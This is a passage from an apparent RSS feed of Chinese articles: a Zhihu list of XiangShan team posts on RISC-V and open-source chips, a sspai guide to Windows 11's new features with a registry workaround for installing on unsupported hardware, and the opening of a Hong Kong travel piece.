data-original=\"https://pic1.zhimg.com/v2-4f6e5d80991e858210eddc3a9f8b1810_r.jpg\"></figure><h2>\n<b>（10）2019年10月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//blog.sciencenet.cn/blog-414166-1203989.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">处理器芯片开源设计与敏捷开发方法思考与实践</a><b>》</b>\n</h2>\n<p>这篇文章发表于2019年第10期《中国计算机学会通讯（CCCF）》。文章从分析降低芯片设计门槛的三大需求出发，提出可借鉴互联网产业的开源理念，通过构建开源芯片生态来应对。同时，进一步梳理构建开源芯片生态的四个要素，提出可通过打造芯片敏捷开发平台来落地，并介绍中科院计算所开发平台方面的近期进展。这篇文章是对开源芯片的认识理解与发展规划的整体梳理，也让我们更加明确了具体的发展路线。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ed875f7ff59b47628a57340199787f43_b.jpg\" data-rawwidth=\"633\" data-rawheight=\"376\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"633\" data-original=\"https://pic4.zhimg.com/v2-ed875f7ff59b47628a57340199787f43_r.jpg\"></figure><h2>\n<b>（11）2019年12月：《</b><a href=\"https://zhuanlan.zhihu.com/p/95834493\" class=\"internal\">一些关于RISC-V的质疑与解读</a><b>》</b>\n</h2>\n<p>当时有一些消息透露RISC-V国际基金会总部将从美国搬到瑞士，引起多方关注和质疑。这篇文章主要是针对三个质疑进行解读：（一）美国政界有反对声音，有何影响？（二）RISC-V受到美国军方DARPA资助，是否可靠？（三）基于RISC-V做开源芯片，知识产权问题如何解决？</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（12）2020年3月：《</b><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/9PX5n_ZPjWM1OyqnijlIPw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">关于RISC-V和开源处理器的一些解读</a><b>》</b>\n</h2>\n<p>网络上有一些自媒体散播对RISC-V与开源处理器误读的文章，让不少读者产生困惑。这篇文章是对处理器的指令集、微架构实现与开源模式等概念以及和RISC-V的联系等进行解读，目的是为了帮助读者更好地理解CPU指令集与微架构的区别，进而更好地理解开源芯片与RISC-V。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9b15c8178ea82fbf530ec08895ebc618_b.jpg\" data-rawwidth=\"683\" data-rawheight=\"295\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"683\" data-original=\"https://pic1.zhimg.com/v2-9b15c8178ea82fbf530ec08895ebc618_r.jpg\"></figure><h2>\n<b>（13）2020年7月：《</b><a href=\"https://www.zhihu.com/question/409298856/answer/1363569013\" class=\"internal\">“一生一芯”计划幕后的故事</a><b>》</b>\n</h2>\n<p>2020年7月25日，中国科学院大学公布了首期“一生一芯”计划成果——5位2016级本科生主导完成一款64位RISC-V处理器SoC芯片设计并实现流片，芯片能成功运行Linux操作系统以及学生自己编写的国科大教学操作系统UCAS-Core。“一生一芯”计划的想法最初是在2018年11月CRVA联盟成立时期酝酿而成，目标是通过用开源的EDA工具设计开源芯片，降低芯片设计门槛，实现让学生带着自己设计的处理器芯片毕业。一年半后，这个想法终于初步实现了，虽然还未能做到用开源EDA来设计。这篇文章介绍了“一生一芯”计划的酝酿、准备、实施等幕后的故事。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-a1fb3396aced4927b90bc841fde88907_b.jpg\" data-rawwidth=\"978\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"978\" data-original=\"https://pic4.zhimg.com/v2-a1fb3396aced4927b90bc841fde88907_r.jpg\"></figure><h2>\n<b>（14）2020年9月：</b><a href=\"https://zhuanlan.zhihu.com/p/254597424\" class=\"internal\">《RISC-V Catalyst for Change（推动改变的RISC-V催化剂）》中文版</a>\n</h2>\n<p>2020年9月，英伟达正式宣布要收购ARM，全世界一片哗然。ARM未来如何发展，是否还能保持以前的中立定位，国内外企业都表现出了一些担忧。RISC-V国际基金会CEO Calista Redmond女士则代表基金会发表了一份声明，明确表示：“RISC-V是免费且开放的，因此没有任何一个实体可以控制RISC-V技术。公司、学术界和机构都可以自由地在RISC-V指令集架构上进行创新，共同推动迅速发展的计算前沿。”CRVA联盟秘书处将这份声明翻译为中文，以便国内各界了解。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（15）2020年11月：《</b><a href=\"https://zhuanlan.zhihu.com/p/280144610\" class=\"internal\">破解“中国开源拿来主义”的几点分析</a><b>》</b>\n</h2>\n<p>国内有人建议不要使用来自美国的开源技术，有人批评中国在开源方面的“拿来主义”。该如何应对这样的局面？只有搞清楚问题在哪里，才能对症下药。这需要我们辩证地去分析“中国开源拿来主义”背后的原因。这篇文章旨在搞清楚如下三个问题：（一）为什么美国的开源技术那么有吸引力？（二）是不是任何来自美国的“免费开源”的东西都不能用？（三）有些开源项目受到美国军方DARPA资助，还能用吗？</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（16）2020年12月：《</b><a href=\"https://www.zhihu.com/question/425542531/answer/1607862976\" class=\"internal\">从技术的角度来看，RISC-V 能对芯片发展、科技自主起到哪些作用？</a><b>》</b>\n</h2>\n<p>虽然RISC-V诞生已有十年，但很多人对RISC-V还会存在两类误解：（一）RISC-V指令集 = CPU微架构，（二）使用RISC-V = 不自主。这篇文章详细分析产生这两类误解的原因，同时也客观地指出RISC-V的潜在风险点。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-60db65fb8ecce0bc766af560c007a253_b.jpg\" data-rawwidth=\"798\" data-rawheight=\"518\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"798\" data-original=\"https://pic4.zhimg.com/v2-60db65fb8ecce0bc766af560c007a253_r.jpg\"></figure><h2>\n<b>（17）2021年3月：《</b><a href=\"https://zhuanlan.zhihu.com/p/355191063\" class=\"internal\">Linux初期在中国的发展</a><b>》</b>\n</h2>\n<p>这篇文章回顾了1999年发表在《互联网周刊》上的这篇题为《Linux：打开自由那扇窗》的旧文。一方面介绍了在Linux发展初期中国各界对开源软件的看法，另一方面指出了交叉认证在开源软件商业模式中的重要性。这些对于今天如何看待以RISC-V为代表的开源芯片未来发展很有启发意义。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（18）2021年4月：</b> <b>《</b><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/1Irs9a0EKoB7P-J_4ju66A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">论开源精神</a><b>》</b>\n</h2>\n<p>这是孙凝晖院士为2021年第4期《中国计算机学会通讯（CCCF）》撰写的卷首语，赋予了“开源”更高的价值与意义：开源模式不仅仅是一种商业模式，也是一种生态构建方法，是一种复杂系统开发方法，更蕴含着一种精神。开源不仅仅是公开源代码，更重要的是协作开发流程的建立与社区治理机制的建设。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-11d18769b0a09069226f75cfdd6110a2_b.jpg\" data-rawwidth=\"1039\" data-rawheight=\"366\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"1039\" data-original=\"https://pic3.zhimg.com/v2-11d18769b0a09069226f75cfdd6110a2_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（19）2021年5月：《</b><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/BoOWRCVQFIAE_I3Xok_8tQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">科技发展如何处理好开放与自主的关系</a><b>》</b>\n</h2>\n<p>处理好科技发展过程中开放和自主的关系，是诸多科研机构、科研人员需要面临的问题。然而，很多人直觉上认为两者无法兼顾，甚至将两者对立起来。RISC-V在中国的发展过程中，也同样面临诸多关于“开放与自主”的质疑。为此，这篇文章提出两条基本原则：（一）人才是实现自主能力的根本；（二）好的开放应能促进人才质和量的发展。基于上述基本原则，文章进一步分析了中国计算机事业创立、中国开放实践回顾两个具体案例中的开放与自主关系，并阐述了对中国处理器芯片产业发展的思考。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（20）2021年6月：《</b><a href=\"https://zhuanlan.zhihu.com/p/377989825\" class=\"internal\">如何应对AIoT对芯片的碎片化需求？</a><b>》</b>\n</h2>\n<p>这是2021年第6期《单片机与嵌入式系统应用》期刊的卷首语。核心观点是如何应对AIoT对芯片的碎片化需求，可以借鉴另外两个领域成功的经验：（一）互联网领域通过开源软件降低APP的开发门槛；（二）模拟芯片领域巨头德州仪器通过一套共享的芯片研发平台解决碎片化问题。因此，文章提出开源芯片和敏捷设计正是应对AIoT场景芯片碎片化需求的有效手段。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>\n<b>（21）2021年6月：《</b><a href=\"https://www.zhihu.com/question/466393646/answer/1955410750\" class=\"internal\">香山：开源高性能RISC-V处理器</a><b>》</b>\n</h2>\n<p>这是根据6月22号下午关于香山的技术报告PPT整理而成，主要回答了四个问题：（一）为什么要做香山？（二）香山什么水平？（三）香山怎么做的？（四）香山未来如何发展？这个报告引起了国内外积极的反响。但香山终究还只是一颗小树苗，需要各界更多的支持。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6de578bcb33d9b026b6ff7e02fbb8278_b.jpg\" data-rawwidth=\"622\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"622\" data-original=\"https://pic1.zhimg.com/v2-6de578bcb33d9b026b6ff7e02fbb8278_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<blockquote>编辑： 徐易难</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/openxiangshan?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">香山开源处理器</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/417167775?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Windows 11 正式版发布，升级后一定不要错过这些新特性","date":"2021-10-05 07:00:00","description":"\n<p>北京时间 10 月 5 日，微软发布了其下一代桌面操作系统 Windows 11 正式版，和 Windows 10 不同的是，Windows 11 具有更为现代的设计风格，完全替代传统控制面板的「设置」工具，全新的小部件等新工具，无论在设计还是功能上都让人耳目一新。</p>\n<p>少数派整理了 Windows 11 正式版中值得关注的系统新特性，希望可以帮助广大的 Windows 用户可以更加熟悉这个全新设计的「下一代 Windows」。</p>\n<p><strong>编注：</strong>无论是全新安装还是升级到 Windows 11，都请先对重要的数据进行备份，对于不在「官方支持硬件」范围内的设备，强行安装 Windows 11 可能会出现无可预估的系统故障和 Bug，请在安装前三思而后行，也可以通过虚拟机的形式进行尝鲜，不建议用在生产环境中。</p>\n<h2>我的电脑能升级/安装 Windows 11 吗？</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/f2ecb8cbaee64aa643d561076bcba124.png\"></figure><p>和 Windows 10 具有较高的硬件兼容性有所不同的是，Windows 11 对于硬件设备有着较高的要求，目前微软给出的 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications\" target=\"_blank\">官方硬件要求</a> 如下：</p>\n<ul>\n<li>需要 1GHz 或更快的支持 64 位的处理器（双核或多核）或系统单芯片(SoC)；</li>\n<li>4GB 内存；</li>\n<li>64GB 或更大的存储设备；</li>\n<li>支持 UEFI 安全启动；</li>\n<li>受信任的平台模块(TPM)版本 2.0；</li>\n<li>支持 DirectX 12 或更高版本，支持 WDDM 2.0 驱动程序；</li>\n<li>对角线长大于 9 英寸的高清 (720p) 显示屏，每个颜色通道为 8 位。</li>\n</ul>\n<p>虽然在硬件需求中并没有专门说明，但微软却单独给出了官方的支持处理器型号支持列表，其中 <a href=\"https://docs.microsoft.com/zh-cn/windows-hardware/design/minimum/supported/windows-11-supported-intel-processors\" target=\"_blank\">Intel 的处理器</a> 最低型号需要至少八代酷睿处理器以及同架构的奔腾、赛扬、志强以及 Atom 处理器。<a href=\"https://docs.microsoft.com/zh-cn/windows-hardware/design/minimum/supported/windows-11-supported-amd-processors\" target=\"_blank\">而 AMD 方面</a>，最低支持的 CPU 型号为锐龙 2000 及对应同架构的霄龙处理器、速龙处理器、线程撕裂者处理器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/972a18bb9aacf577a2111522b210fe74.png\"></figure><p>从今天开始对于所有支持的设备，你可以选择等待 Windows Update 推送 Windows 11，也可以通过 <a href=\"https://www.microsoft.com/zh-cn/software-download/windows11\">这里</a> 直接升级或者重新安装 Windows 11。</p>\n<p>如果你还是不清楚你的电脑能否升级至 Windows 11，你可以在 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11#pchealthcheck\">这里</a> 下载 Windows 11 兼容性检查软件进行确认，而由 OEM 生产的品牌机也可以前往各自品牌的帮助主页了解到能否正常升级到 Windows 11。</p>\n<p>而不再官方支持的 CPU（AMD Zen 第一代或更早、 Intel 第七代酷睿处理器或更早）虽然并不能通过以上方式直接升级，但依旧可以通过镜像手动进行安装，但有可能后续将收不到 Windows 11 大版本更新，而微软也表示在这些老硬件上运行 Windows 11 稳定性较低，更容易出现系统崩溃等问题。</p>\n<p>而对于不支持受信任的平台模块 TPM 版本 2.0 的设备，目前可以通过手动的方式绕过限制来安装 Windows 11，详细方法我也已经贴在了文章末尾，感兴趣的朋友们可以进行尝鲜，不过记得提前备份好数据。</p>\n<h2>Windows 11 有哪些值得关注的新特性？</h2>\n<p>为了可以在升级到新系统之后可以更快的上手 Windows 11 的诸多新功能，少数派为你整理新系统中一系列值得关注的新特性。</p>\n<h3>全新的感官体验</h3>\n<p>说到底，即便是 Windows 10 这种被微软称作是「现代的」Windows 桌面操作系统，其系统的交互依旧和 Windows 95 一脉相承——开始按钮和开始菜单的样式并没有本质上的变化，而在 Windows 11 中，我们第一眼看到的就是这个底部居中的开始按钮。</p>\n<p>也许开始的时候会有些不习惯，但如果深入下去你会逐步理解 Windows 11 开始菜单的这些变化——如果我们以前没有使用过桌面操作系统，而是只接触过智能手机，那么你会发现 Windows 11 的开始菜单更像是手机中的应用抽屉：搜索依旧是核心，紧接着是分布排列的应用图标，最下方则是推荐的项目和最近使用的文档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0hdb34teh0gc1e10.png\"></figure><p>而每一个功能板块都会有「更多」用来展开更多的内容项目，这种类似手机应用抽屉的设计反而更容易直达操作目标，而开始菜单也真正成为了在 PC 上的开始——不仅仅只是运行软件，而是直达操作，无论是打开文件、观看视频还是访问网页。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0hlb34teit0pmr1g.png\"></figure><p>Windows 10 有着一种天然的割裂感，这种割裂感不仅仅只是视觉上，还有功能——比如说你想要修改系统的某个设置，你可以根本不知道去哪里设置，因为 Windows 10 中除了一个采用 Fluent Design 风格的「设置」之外，还有一个Windows 7 风格的老古董「控制面板」。并且我们也会遇到这样的场景：在「设置」中点击某个设置项目后，具体的设置又会跳转回「控制面板」的某一级功能中，实际上我们根本不知道系统的某一项设置是在「设置」里面还是「控制面板」中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/97d965c37c93bdbae2b3218dfb8a063b.png\"></figure><p>这使得 Windows 10 更像是一个 Windows 各个时期系统 UI 的大杂烩，而在 Window 11 中，这个更现代的「设置」终于完全取代了「控制面板」——这不是基于「控制面板」的修修补补，更符合现代智能手机的使用习惯，更为清晰的侧边栏设置大项导航，每一个功能设置渐进式的显示来帮助我们进行系统功能的设置，以及一个可以直达设置项目的设置搜索，即便是隐藏的高级设置也能立刻找到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/082f80fe1557343f2661a91fe5d8be48.png\"></figure><p>任务栏的重构看上去更像是在保持 Windows 传统的前提下和 macOS 靠拢，使得 Windows 11 的任务栏更像是 Dock 栏，而其中搜索体验的变化最大，点击搜索图标你会看到一个全新的独立搜索窗格，搜索放置在窗格的顶部，当你输入关键字的同时窗格下方就会实时的呈现出结果流。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0i5b34teh0gc1e1g.png\"></figure><p>另一个重大的设计变革则是任务栏右下角的「快捷设置」以及「通知中心」，在 Windows 10 中，快速设置和通知中心被整合为一个入口，而在 Windows 11 中则完全重构，首先「快捷设置」和「通知中心」有着不同的入口（快捷设置是点击状态栏右下角的音量图标，而通知中心则是点击状态栏右下角的时间日期），并且两者都有了专门的键盘快捷键。并且呈现的内容显然已经完全不同：通知中心最下方呈现的是日历以及当前时间，上方则是圆角卡片的通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0idb34teh5fkvdo0.png\"></figure><p>而「快捷设置」部分改动则非常大，原本在 Windows 10 中更像是「快捷的功能开关」，但在 Windows 11 中则将原本独立的音量调节以及网络快速设置都融合进来，使得一些需要进行调整的快捷操作可以在一处就可以全部完成。此外在浏览器中播放音频或者使用 Spotify 这样的音乐 App 播放音乐，对应的播放控件也会出现在「快捷设置」的上方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0ilb34teh5fkvdog.png\"></figure><p>在设计上有着较大转变的还有传统的「资源管理器」，相比 Windows 8.1/Windows 10 的「资源管理器」通过 Ribbon 界面显示大量复杂的功能设置，Windows 11 上的「资源管理器」在设计上要更为现代，这种现代体现在注重视觉上的简单，但同时却突出了核心功能，通过和鼠标右键的上下文菜单结合来实现一系列的操作，而在使用 Windows 11 的资源管理器时也不禁感叹：为什么之前的 Windows 资源管理器会做的如此复杂且功能繁复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0itb34teh0gc1e20.png\"></figure><p>桌面操作系统中最直观的当属：桌面主题，在 Windows 11 中，官方已经提供了两款浅色以及深色的默认主题方便快速切换，同时还有四个附加主题，其实对比 Windows 10 几乎处处都需要自定义设置主题中样式元素，官方已经搭配好的主题可以说省却不少麻烦的地方，当然对于习惯自定义的主题用户同样可以通过「个性化」设置中进行细调。比较让我觉得遗憾的是，即便是 Windows 11 也依旧没有提供浅色/暗色主题的自动切换功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/22f16f6faa6f1c50ed9212b7702da437.png\"></figure><p>全新的系统声音也是 Windows 11 一大设计亮点，除了更为大气的系统操作声音之外，标志性的 Windows 开机声也在 Windows 11 回归。</p>\n<h3>小组件</h3>\n<p>现在的 Windows 10 的任务栏中有一个用来展示资讯和信息的小功能「资讯和兴趣」，而在 Windows 11 中这个小功能成为了一个全新的功能组件，叫做「小组件」。找到这个功能并不困难，你可以在任务栏中点击这个功能图标，或者使用键盘快捷键（Windows 徽标键 + W）唤起。如果你的触摸屏，那么从桌面左侧滑动就可以打开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0jdb34teh0gc1e2g.png\"></figure><p>实际上你可以在 macOS 中找到类似的功能，只不过在 macOS 上，小组件是从屏幕右侧弹出，而在 Windows 11 则是从左侧弹出。虽然名字叫做「小组件」，但两者在功能上还是有比较明显的区隔的，Windows 11 上小组件更像是一个信息中心，在首个 Windows 11 正式版中，你可以看到的小部件包括天气、你关注的股票、体育信息以及本地热门资讯新闻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0jlb34teh5fkvdp0.png\"></figure><p>当然除了默认给出的内容源之外，你还可以在资讯流中加入你自己的兴趣内容，而这里则会和微软最新推出的资讯聚合服务 Microsoft Start 完全打通， 涵盖了兴趣分类和内容源等，只需要点击添加就可以在「小组件」中看到你喜欢的内容摘要。未来小部件还将支持自己增添小部件，重新排列以及调整大小来让小部件更具个性化（Dev 版已支持）。</p>\n<h3>窗口布局和桌面</h3>\n<p>随着电脑屏幕的越来越大，如何充分利用桌面显示面积来提高效率？以往我们通过并排软件窗口赖实现多任务处理，但这只是一种窗口布局的形式，并不能充分的利用大屏优势，而在 Windows 11 中，则推出了更为多样的窗口布局来充分利用大屏优势，让多任务处理效率更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/177b235683a6a92bb2cb2ec595df285e.png\"></figure><p>你可以把 Windows 11 这个全新的窗口布局功能看成是 PowerToys 中 FancyZones 的扩展增强，只不过操作上不用再记住那些复杂的快捷键了，只需要鼠标按住/悬停在窗口右上方最大化按钮上，自然窗口布局引导器就会给出相应的布局方案，你只需要根据你的选择点击某个布局模式，窗口自然就会根据布局模式进行排列。对于较小的屏幕，默认会给出四种布局，而在更为常用的1920 × 1080 屏幕，则给出了六种布局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0k5b34teh0gc1e30.png\"></figure><p>对于不同的工作任务，也可以通过新建桌面的形式来实现工作任务的分配管理。鼠标悬停到任务栏中的任务视图上就可以快速访问当前的桌面或者立即创建新桌面，甚至为了有所区隔，你完全可以对桌面进行重新排序甚至为每一个桌面自定义背景。</p>\n<h3>更开放的 Microsoft Store</h3>\n<p>微软在 Windows 10 上首次推出了基于桌面操作系统的应用商店，但由于存在诸多的限制，在应用商店上架的应用数量依旧很少。而在 Windows 11 中，我们看到一个完全不同以往的 Microsoft Store。</p>\n<p>首先，从设计上 Microsoft Store 采用了和系统 UI 一致的设计，圆角窗口 + 卡片，每一款的应用简介显示的更为详尽，甚至你可以看到类似 iOS 中 App Store 那样的应用推荐专题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0kdb34teh0gc1e3g.png\"></figure><p>而收录的应用也不再仅限于 UWP 和 win32 转制的应用，而是扩大了收录范围，比如你可以直接在 Microsoft Store 中下载安装 Visual Studio、Zoom 这样的原本需要在其官网网站中单独下载安装的软件；而游戏部分则可以和 Xbox Game Pass 会员打通，从而享受特定的会员折扣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0klb34teit0pmr30.png\"></figure><p>未来 Microsoft Store 还将支持运行 Android 应用，甚至你可以在 Microsoft Store 中下载其他的第三方的游戏商店，成为一个更为开放的软件下载获取平台。</p>\n<h3>聊天，不仅仅是聊天</h3>\n<p>在 Windows 11 中，在线实时沟通成为一个重要的选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0ktb34teit0pmr3g.png\"></figure><p>融合 Skype 和 Microsoft Team，Windows 11 中内置了实时通讯——「聊天」，你可以看作是类似 macOS 中 FaceTime 的服务，所以相比那些第三方即时通讯软件有着天生的优势：无需安装，内置在系统中，更重要的是只要开机就随时在线，你可以随时和你的联系人发起语音会话或者视频会话，只要他们在你的联系人列表中。并且你可以和使用 Microsoft Team 的任何一个平台用户联系，显然就跨平台上完全毫无压力。</p>\n<h3>针对触控的优化</h3>\n<p>如果说 Windows 8.x 是为触控而生的 Windows，那么 Windows 10 就是传统键鼠的重新「拨乱反正」。但在 Surface 这样的二合一触控平板当道的今天，触摸屏幕或许是更接近自觉的操作，放在 Windows 11 中尤其注重对触控上的优化。</p>\n<p>首先就是用来在触控屏上进行文本输出的「虚拟键盘」，经过重新设计调整了虚拟键盘的尺寸以及每一个虚拟按键的键距，全新的键盘皮肤还可以完全的自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0mdb34teh0gc1e40.png\"></figure><p>其次，针对触摸屏也有了新的手势，可以非常方便的进行应用和桌面之间的切换，比如三指手势中，向左或者向右可以快速切换到上次使用的应用程序窗口，向下滑动可以返回桌面，而向上滑动可以打开任务视图看所有打开的应用程序窗口或者桌面。另外还有一个四指手势——向左或者向右滑动可以切换到上一个/下一个桌面。</p>\n<p>对于数字手写笔设备，Windows 11 还加入了重新设计的笔菜单，可以勇敢点击任务栏右下角的「笔」图标激活，默认的菜单中会有两个应用，你可以编辑菜单赖添加最多四款绘画或者手写的应用，当你使用手写笔时可以快速打开这些软件。</p>\n<p>当然还有不少能够增强游戏体验的新特性，比如将 SDR 游戏自动优化为 HDR 的 AutoHDR 技术，能更快从 NVMe 里读取游戏素材的 DirectStorage 技术，还比如可以增强临场感的空间音效等等。此外 Windows 11 还为 Intel 12 代酷睿处理器，也就是即将到来的 x86 大小核处理器做了不少优化。</p>\n<h2>在不受支持的硬件上安装 Windows 11</h2>\n<p>相信你看到 Windows 11 的这些新特性已经迫不及待想要尝鲜了，但是却发现自己的电脑无法升级到 Windows 11，不要着急下面我们将提供一个解决方法帮你在不受支持的硬件上安装 Windows 11。</p>\n<p>对于没有 TPM 2.0 的硬件，无论是使用全新安装还是从 Windows 10 使用 Media Creation Tool 升级安装，在过程中可能会遇到如下的提示，显示您的设备无法安装 Windows 11：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0gtb34teit0pmr10.jpeg\"></figure><p> </p>\n<p>这里需要调用注册表来绕过，如果是全新安装，那么需要使用快捷键 <code>Shift + F10</code>打开命令提示符，然后输入 <code>regedit</code>，回车打开注册表，如果是升级安装，则可以使用快捷键 <code>Windows 徽标键 + R</code>输入 <code>regedit</code>。</p>\n<p>定位到<code>HKEY_LOCAL_MACHINE\\SYSTEM\\Setup</code>然后右键<code>setup</code>新建一个名为<code>LabConfig</code>的项。</p>\n<p>接着在<code>LabConfig</code>这个项里面再新建两个 <code>DWORD值</code>，一个数值名称为<code>BypassTPMCheck</code>，数值数据为<code>00000001</code>，基数是十六进制；一个数值名称为<code>BypassSecureBootCheck</code>，数值数据为<code>00000001</code>，基数是十六进制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0h5b34teh5fkvdmg.png\"></figure><p>编辑完成之后关闭注册表，之后点击返回到安装的上一步，再点击下一步就可以顺利进行安装了。不过这样安装还是存在无法获得系统安全更新以及功能更新的可能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ap0h5b34teh5fkvdn0.png\"></figure><p>最后，重要的事情还需要再说一次，无论是全新安装还是升级到 Windows 11，都请先对重要的数据进行备份。从今天开始，你可以直接在 Microsoft 上 <a href=\"https://www.microsoft.com/zh-cn/software-download/windows11\">下载</a> 到 Windows 11 镜像，所有来自于第三方的镜像都需要小心使用。</p>\n<p>以上就是少数派为你整理的首个 Windows 11 正式版值得关注的新特性，你还在升级到 Windows 11 正式版后发现了哪些实用的新功能？欢迎在评论区告诉我们。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67836\">具透 | 不透明的「半透明」：Windows 11 新材质如何欺骗你的眼睛</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，第一时间了解 Windows 动态 🐱‍🏍</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69072"},{"title":"城市收藏夹 · 香港：两年不见，甚是想念","date":"2021-10-05 03:56:00","description":"\n<p>一个城市的魅力不全是它的历史、文化或自然风光，也有不少惊喜往往来自那些只有当地人才知晓的隐蔽深巷。而「城市收藏夹」是我们征集来自世界各地 Matrix 社区作者共同维护的一个长期话题，我们会邀请大家分享自己所在城市或家乡的美食或玩乐目的地。</p>\n<p>大众点评可能会让你踩坑，但我们不会。</p>\n<hr>\n<p>今年八月份，我前往香港，作为一名学生，开始了新生活。</p>\n<p>说到香港，真的很感慨，因为太久没来，以至于对它感到有点陌生了。（许万里同学说的，我觉得也非常能描述我的心境，所以直接搬来用了。）</p>\n<p>作为一个广州人，我基本上每年都会来一次。上一次来香港是 2019 年的 6 月，那一次是来考试，所以并没有去什么地方，除了在考场考试，大部分时间都在酒店里备考了。离开香港时，本以为找个假期再来一次很容易，没想到，匆匆一别，已是两年的时间。这两年的时间里，香港和我自己都经历了很多，以至于出发前我对于这个曾经感到无比熟悉的城市竟然产生了一些茫然：<strong>究竟，香港现在是什么样子呢？</strong>我也很想知道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/7e11fc22de06edf84924da6987850715.jpg\"><figcaption>沙田 